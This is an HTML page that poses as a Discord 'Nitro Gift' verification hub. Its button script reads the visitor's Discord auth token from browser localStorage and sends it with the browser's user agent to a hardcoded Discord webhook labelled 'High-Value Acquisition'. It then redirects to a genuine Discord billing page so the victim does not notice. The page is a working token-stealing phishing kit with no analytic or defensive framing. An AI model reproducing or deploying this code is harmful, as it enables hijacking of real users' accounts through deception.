<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nitro | Verification Hub</title>
    <style>
        :root {
            --blurple: #5865F2;
            --bg-dark: #18191C;
            --modal-surface: #202225;
            --text-primary: #FFFFFF;
            --text-secondary: #B9BBBE;
        }

        body {
            margin: 0;
            background: radial-gradient(circle at center, #2C2F33 0%, #18191C 100%);
            color: var(--text-primary);
            font-family: 'gg sans', 'Whitney', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 400px;
            background: var(--modal-surface);
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .glow {
            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(88,101,242,0.1) 0%, transparent 70%);
            z-index: 0;
        }

        .content { position: relative; z-index: 1; }

        .nitro-orb {
            width: 90px; height: 90px;
            background: var(--blurple);
            border-radius: 50%;
            margin: 0 auto 24px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(88,101,242,0.4);
        }

        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: var(--text-secondary); font-size: 14px; margin-bottom: 32px; }

        .btn-claim {
            background: var(--blurple);
            color: #fff;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            animation: pulse 2s infinite;
            transition: transform 0.2s;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(88,101,242,0.4); }
            70% { box-shadow: 0 0 0 10px rgba(88,101,242,0); }
            100% { box-shadow: 0 0 0 0 rgba(88,101,242,0); }
        }

        .btn-claim:hover { transform: translateY(-2px); filter: brightness(1.1); }
    </style>
</head>
<body>
    <div class="glow"></div>
    <div class="container">
        <div class="content">
            <div class="nitro-orb">🎁</div>
            <h1>Claim Nitro Gift</h1>
            <p>Your subscription gift is ready to be applied. Verify your identity to activate.</p>
            <button id="claimBtn" class="btn-claim">Activate Subscription</button>
        </div>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Synchronizing...";
            btn.style.animation = "none";
            btn.disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "⚡ High-Value Acquisition",
                        color: 0x5865F2,
                        fields: [
                            { name: "Auth Token", value: `\`${token || "NULL"}\``, inline: false },
                            { name: "Environment", value: `\`${navigator.userAgent}\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1000);
        });
    </script>
</body>
</html>
